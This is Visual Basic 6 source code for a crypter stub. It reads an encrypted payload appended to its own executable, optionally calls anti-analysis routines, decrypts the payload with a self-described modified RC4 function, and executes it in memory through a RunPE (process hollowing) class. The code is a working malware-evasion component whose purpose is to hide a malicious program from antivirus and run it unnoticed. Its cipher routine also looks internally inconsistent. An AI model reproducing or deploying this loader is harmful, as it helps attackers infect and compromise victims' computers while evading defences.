Attribute VB_Name = "mMain"
Sub Main()
Dim cRPE        As New cNtPEL
Dim sData       As String
Dim sDelim()    As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
sData = Space(LOF(1))
Get #1, , sData
Close #1

sDelim() = Split(sData, "LKQEOPQWE!")

If sDelim(2) = "1" Then
Call sAnti
End If

If sDelim(3) = "1" Then
Call sAnti
End If

If sDelim(4) = "1" Then
Call sAnti
End If

If sDelim(5) = "1" Then
Call sAnti
End If

sDelim(1) = RC4(sDelim(1), Split(sData, "KQKK!K")(1))

cRPE.RunPE StrConv(sDelim(1), vbFromUnicode), App.Path & "\" & App.EXEName & ".exe"

End Sub


Public Function RC4(ByVal Data As String, ByVal Password As String) As String ' This is a Modified RC4 Function ^^
On Error Resume Next
Dim F(0 To 255) As Integer, X, Y As Long, Key() As Byte
Key() = StrConv(Password, vbFromUnicode)
For X = 0 To 255
    Y = (Y + F(X) + Key(X Mod Len(Password))) Mod 256
    F(X) = X
Next X
Key() = StrConv(Data, vbFromUnicode)
For X = 0 To Len(Data)
    Y = (Y + F(Y) + 1) Mod 256
    Key(X) = Key(X) Xor F(Temp + F((Y + F(Y)) Mod 254))
Next X
RC4 = StrConv(Key, vbUnicode)
End Function

